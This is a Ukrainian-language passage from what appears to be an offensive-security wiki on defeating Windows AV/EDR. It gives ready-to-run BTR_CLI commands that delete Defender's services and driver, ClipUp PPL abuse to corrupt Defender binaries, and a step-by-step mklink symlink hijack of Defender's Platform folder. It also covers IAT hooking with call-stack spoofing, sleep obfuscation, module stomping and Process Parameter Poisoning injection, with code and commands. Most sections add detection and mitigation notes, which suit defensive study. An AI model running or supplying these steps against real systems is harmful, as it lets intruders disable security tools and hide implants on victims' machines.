| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створення/оновлення значення реєстру та створення відсутніх шляхів до ключів |

У діях 5 і 6 роздільником ключа/значення на диску є **два послідовні зворотні скісні риски**; шлях у стандартному форматі не буде розділено коректно. Файл зворотного зв’язку здебільшого повторює запит, але перші чотири байти даних кожного елемента стають результатом `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля прапорців, BTR зсуває шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Процес роботи `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує повний ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв’язку, серіалізує/обчислює контрольні суми/шифрує послідовність дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як драйвер системного запуску для `-trigger boot`. Пряме налаштування в реєстрі оминає звичайний шлях SCM `CreateServiceW`, тому подія встановлення служби з ID 7045 **не створюється**. Артефакти, що запускаються під час завантаження, пізніше можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` до того, як стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою з високим пріоритетом `Boot Bus Extender` натомість забезпечує виконання у Phase 1: NTFS уже доступна, але багато драйверів безпеки із запуском під час старту системи та служби EDR у user mode ще не ініціалізовані. Фільтри із запуском під час старту системи, як-от `WdFilter`, можуть уже бути завантажені, але BTR може видалити їхні двійкові файли або конфігурацію служб до наступного запуску та видалити виконувані файли служб до того, як SCM їх запустить. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання драйверів під час завантаження та має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. PoC додає на початок Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує обсяг доказів, а розміщення зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Високосигнальні кореляції для виявлення

Правила, що спираються лише на підпис, і список заблокованих уразливих драйверів Microsoft не протидіють зловживанню передбаченою функціональністю BTR. Віддавайте перевагу наведеним поведінковим кореляціям, розрізняючи легітимний ланцюжок походження Defender і довільний процес запуску.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальною ознакою підготовки BTR. Потік ADS `.dat`, прикріплений до того самого `.sys`, викликає особливу підозру, оскільки легітимний Defender зазвичай розміщує зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте безпосереднє створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, з відсутністю відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR із процесу, не пов’язаного з Defender, із подальшим видаленням файлів, яке виконує `System`/PID 4, особливо якщо йдеться про двійкові файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежте й аудитуйте надання/увімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо для довіри, якщо драйвер засобу безпеки підготовлений через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів/рівнів, завдяки якій втручатися один в одного можуть лише захищені процеси з таким самим або вищим рівнем. Зловмисник, який може легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, може перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений механізм запису із захистом PPL у захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і будь-які завантажені DLL) має бути підписаний EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Необхідно вказати сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки створення.

Див. також ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент з відкритим вихідним кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Шаблон використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Примітив LOLBIN: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає окремий процес і приймає параметр для запису файлу журналу за вказаним користувачем шляхом.
- Якщо його запущено як процес PPL, запис файлу виконується з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Список коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (узагальнено)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із прапорцем `CREATE_PROTECTED_PROCESS` за допомогою лаунчера (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху до файлу журналу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо цільовий бінарний файл зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис із підтримкою PPL відбувається до того, як AV блокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби та перезавантаження потрібні права локального адміністратора/SYSTEM.
- Час має вирішальне значення: ціль не повинна бути відкрита; виконання під час завантаження допомагає уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківським процесом є нестандартний launcher, під час завантаження системи.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільно запускаються раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів Defender/каталогів Platform; неочікуване створення/зміна файлів процесами з прапорцями protected-process.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL небінарними файлами AV.

Заходи захисту
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і з якими батьківськими процесами; блокуйте запуск ClipUp поза легітимними сценаріями.
- Належне керування службами: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що ввімкнено захист Defender від втручання та захист раннього запуску; перевіряйте помилки запуску, що вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте вимкнення створення коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Втручання в Microsoft Defender через Symlink Hijack каталогу версії Platform

Windows Defender визначає платформу, з якої він запускається, шляхом переліку підкаталогів у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підкаталог із найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час вибору враховуються записи каталогів, зокрема точки повторної обробки каталогів (symlinks). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/symlinks у каталозі Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані засоби (mklink)

Чому це працює
- Defender блокує запис у власні каталоги, але під час вибору платформи довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покрокова інструкція (приклад)
1) Підготуйте доступну для запису копію поточного каталогу платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть у Platform символічне посилання на каталог із вищою версією, яке вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слідкуйте за новим шляхом процесу в `C:\TMP\AV\` і за конфігурацією служби/реєстром, де має бути вказано це розташування.

Параметри post-exploitation
- DLL sideloading/code execution: розміщуйте/замінюйте DLL, які Defender завантажує з каталогу своєї програми, щоб виконувати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть символічне посилання на версію, щоб під час наступного запуску налаштований шлях не вказував на потрібне розташування, і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для неї потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team можуть перенести runtime-обхід засобів виявлення з C2-імпланта безпосередньо в цільовий модуль, перехоплюючи його Import Address Table (IAT) і спрямовуючи вибрані API через керований зловмисником position-independent code (PIC). Це узагальнює обхід засобів виявлення за межами невеликої кількості API, які відкривають багато наборів інструментів (наприклад, CreateProcessA), і поширює ті самі засоби захисту на BOF і post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC-блоб поруч із цільовим модулем за допомогою reflective loader (на початку або як супровідний файл). PIC має бути самодостатнім і незалежним від розташування.
- Під час завантаження host DLL перегляньте його IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC-обгортки.
- Кожна PIC-обгортка виконує обхід засобів виявлення перед передаванням керування реальній адресі API через tail-call. Типові методи обходу включають:
  - Маскування/зняття маскування пам’яті під час виклику (наприклад, шифрування ділянок beacon, RWX→RX, зміна назв/дозволів сторінок), а потім їх відновлення після виклику.
  - Call-stack spoofing: створіть нешкідливий стек і перейдіть до цільового API так, щоб під час аналізу стека викликів визначалися очікувані кадри.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або аналогічний) міг реєструвати API, які потрібно перехоплювати для Beacon, BOF і post-ex DLL.

Чому тут використовується IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений імпорт, без змін у коді інструмента й без потреби покладатися на Beacon для проксування певних API.
- Охоплює post-ex DLL: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати ті самі методи маскування/обходу аналізу стека до їхніх викликів API.
- Відновлює надійне використання post-ex команд, що створюють процеси, проти засобів виявлення на основі стека викликів, обгортаючи CreateProcessA/W.

Мінімальна схема IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть обгортки компактними й безпечними для PIC; отримуйте справжній API через оригінальне значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки доступними для запису й виконання одночасно.

Заглушка для підміни call stack
- PIC-заглушки у стилі Draugr створюють фальшивий ланцюжок викликів (адреси повернення у benign modules), а потім переходять до справжнього API.
- Це обходить виявлення, яке очікує канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з техніками обрізання/зшивання стека, щоб опинитися в очікуваних фреймах перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLL, щоб PIC та hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро отримували переваги від того самого шляху обходу без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза образами (heap/anon); періодична перевірка import pointers.
- Аномалії стека: адреси повернення, що не належать завантаженим образам; раптові переходи до не-image PIC; неузгоджена генеалогія RtlUserThreadStart.
- Телеметрія завантажувача: записи в IAT усередині процесу, рання активність DllMain, що змінює import thunks, неочікувані RX-регіони, створені під час завантаження.
- Обхід image-load виявлення: якщо виконується hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks для маскування пам’яті (наприклад, simplehook) і PIC для обрізання стека (stackcutting)
- PIC-заглушки для підміни call stack (наприклад, Draugr)


## IAT Hooking під час імпорту + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks під час імпорту через resident PICO

Якщо ви контролюєте reflective loader, можна встановити hooks під час `ProcessImports()`, замінивши вказівник `GetProcAddress` завантажувача власним resolver, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (постійний PIC-об’єкт), який зберігається після того, як transient loader PIC звільнить свою пам’ять.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver завантажувача (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте пошук hooks на основі hash, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте виклик справжньому `GetProcAddress`.
- Реєструйте цільові hooks під час компонування за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишатиметься дійсним, бо він розміщений усередині resident PICO.

У результаті відбувається **перенаправлення IAT під час імпорту** без патчингу секції коду завантаженої DLL після завантаження.

### Примусове додавання імпортів, доступних для hooking, коли ціль використовує PEB-walking

Hooks під час імпорту спрацьовують, лише якщо функція справді є в IAT цілі. Якщо модуль отримує адреси API через PEB-walk + hash (без запису імпорту), примусово додайте справжній імпорт, щоб завантажувач обробив його через `ProcessImports()`:

- Замініть пошук експортів за hash (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор додасть запис IAT, що дасть змогу перехопити імпорт, коли reflective loader оброблятиме його.

### Sleep/idle obfuscation у стилі Ekko без патчингу `Sleep()`

Замість патчингу `Sleep` встановлюйте hooks на **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок obfuscation у стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callbacks, які викликають `NtContinue` зі сформованими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): надати образу права `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` увесь відображений образ → виконати блокувальне очікування → розшифрувати RC4 → **відновити права доступу для кожної секції**, пройшовши PE sections → сигналізувати про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і встановіть регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив виконання, поки образ замаскований. Цей підхід приховує модуль від сканерів під час простою та уникає класичної сигнатури “patched `Sleep()`”.

Ідеї для виявлення (на основі телеметрії)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суцільних буферів розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням прав доступу окремо для кожної секції.

### Runtime CFG registration для sleep-obfuscation gadgets

У цілях із CFG перший непрямий перехід до gadget посередині функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG-метаданих модуля. Щоб ланцюжки у стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму адресу призначення, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` із записами `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених образів (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси образу** й охоплювати **повний розмір образу**.
- Для вручну відображених/PIC/stomped регіонів використовуйте **базову адресу виділеної області** та її розмір.
- Позначайте не лише dispatch gadget, але й експорти, до яких здійснюються непрямі виклики (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які керовані атакувальником виконувані секції, які стануть непрямими цілями.

Це перетворює sleep-ланцюжки у стилі ROP/JOP із примітива, що “працює лише в процесах без CFG”, на повторно використовуваний механізм для `explorer.exe`, браузерів, `svchost.exe` та інших endpoint-процесів, скомпільованих із `/guard:cf`.

### Підміна стека sleeping threads із підтримкою CET

Повна заміна `CONTEXT` створює багато шуму й може спричинити проблеми в системах із CET Shadow Stack, оскільки підмінений `Rip` має відповідати апаратному shadow stack. Безпечніший підхід до sleep-masking:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть копію справжнього TEB/TIB поточного потоку.
- Отримайте справжній контекст потоку, що перебуває в очікуванні, за допомогою `GetThreadContext`.
- Скопіюйте **лише** справжній `Rip` у підмінений контекст, залишивши підмінений стан `Rsp`/стека без змін.
- Під час очікування скопіюйте `NT_TIB` підміненого потоку в TEB поточного потоку, щоб stack walkers виконували unwind у межах коректного діапазону стека.
- Після завершення очікування відновіть оригінальні TIB і контекст потоку.

Це зберігає узгоджений із CET вказівник інструкції, водночас вводячи в оману EDR stack walkers, які покладаються на метадані стека TEB для перевірки unwind.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue надто легко розпізнати за сигнатурою, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із suspended helper thread, використовуючи queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте підготовлені фрейми `CONTEXT`/APCs у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку helper-потоку, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно сигналізувати про подію старту й заблокувати потік.
- Призупиніть головний потік перед відновленням TIB/контексту (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити проміжок часу, коли сканер може зафіксувати частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі маскування RC4 і підміни стека.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleep, очікування або APC dispatch.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, які непрямо викликають `SystemFunction032`, `VirtualProtect` або helper-функції відновлення прав доступу секцій.
- Повторне використання коротких сигнатур gadgets на кшталт `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`) як dispatch pivots у signed modules.


## Точковий Module Stomping

Module stomping виконує payload із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної виконуваної пам’яті або завантаження нової sacrificial DLL. Ціллю перезапису має бути **завантажений образ, прив’язаний до файла на диску**, у якому кодову область можна використати для payload, не пошкодивши шляхи коду, потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала область коду призведе до аварійного завершення процесу. Надійніший робочий процес:

1. Перелічіть модулі цільового процесу й залиште **список включення лише з назвами** вже завантажених DLL.
2. Спершу зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте DLL-кандидати на диску та порівняйте розмір PE-секції **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір виконуваної секції **після відображення в пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Оцініть **масштаб впливу**: якщо payload перевищує межу вибраної функції, він перезапише суміжні експорти, розміщені після неї в пам’яті.

Типові допоміжні засоби для recon/вибору цілі, які трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Надавайте перевагу DLL, **які вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу exports, які цільова програма виконує рідко, інакше звичайні шляхи виконання коду можуть звернутися до перезаписаних байтів до або після створення thread.
- Для великих implants часто потрібно змінити вбудовування shellcode: замість string literal використовувати **byte-array/braced initializer**, щоб уся довжина буфера коректно відображалася у вихідному коді injector.

Detection ideas
- Віддалений запис у **виконувані сторінки, прив'язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість більш поширених приватних виділень RWX/RX.
- Точки входу exports, байти яких у пам'яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені threads або зміни контексту виконання, які починають виконувати код усередині легітимного DLL export, перші байти якого нещодавно змінили.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок DLL `.text`, після яких створюється thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін'єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений процес-ціль вона використовує те, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії даних, які можна отруїти й які копіює `CreateProcessW`

Корисні носії даних:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв даних:

- `lpCommandLine` має вказувати на **доступну для запису пам'ять** для `CreateProcessW`; його довжина обмежена **32 767 символами Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode із послідовних рядків `NAME=VALUE\0`, завершених додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною задокументованою угодою.

Так звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із даними запуску, контрольованими зловмисником, і дозволяє Windows виконати копіювання між процесами.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою примітивів, що забезпечують **лише читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримайте `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитайте віддалений `PEB`
3. Перейдіть за `PEB.ProcessParameters`
4. Прочитайте `RTL_USER_PROCESS_PARAMETERS`
5. Використайте вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Типовий ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через повернутий дескриптор головного потоку.

Це дає змогу уникнути кількох API, за якими часто стежать під час ін'єкцій:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та staged shellcode

Усі три носії — це **рядкові або схожі на рядки дані**, тому під час передавання необроблений payload із `0x00` буде обрізаний. Практичний обхідний шлях — **null-free перший етап**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтезування констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає першому етапу змогу формувати рядки у стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в параметр, що передається.

### Виклики API зі стеку на першому етапі

Коли першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтовий x64 shadow space**
- задати `RCX`, `RDX`, `R8`, `R9` константами або вказівниками відносно `RSP`
- зберігати **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку до області пам’яті з правами `PAGE_READWRITE`, змінити її права на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і перейти до неї, уникаючи прямого виділення пам’яті з правами RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які надають **сторінкам параметрів процесу права на виконання**
- за цією зміною прав іде `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
